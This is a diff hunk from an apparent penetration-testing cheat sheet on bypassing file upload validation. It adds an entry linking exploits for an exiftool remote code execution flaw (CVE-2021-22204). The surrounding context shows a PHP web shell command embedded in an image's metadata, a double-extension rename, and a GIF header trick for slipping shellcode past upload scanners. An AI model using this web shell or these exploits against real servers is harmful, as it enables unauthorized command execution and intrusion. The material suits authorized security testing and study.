@@ -22,6 +22,9 @@ For file uploads which validate image size using php getimagesize(), it may be p
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 mv file.jpg file.php.jpg
 ```
+### exiftool
+Exiftool versions 7.44-12.23 are vulnerable to remote code execution. [CVE-2021-22204](https://github.com/se162xg/CVE-2021-22204).  There is also a metasploit module available.  [exploit-db](https://www.exploit-db.com/download/49881)
+
 ### GIF89a; header
 GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:
 ```
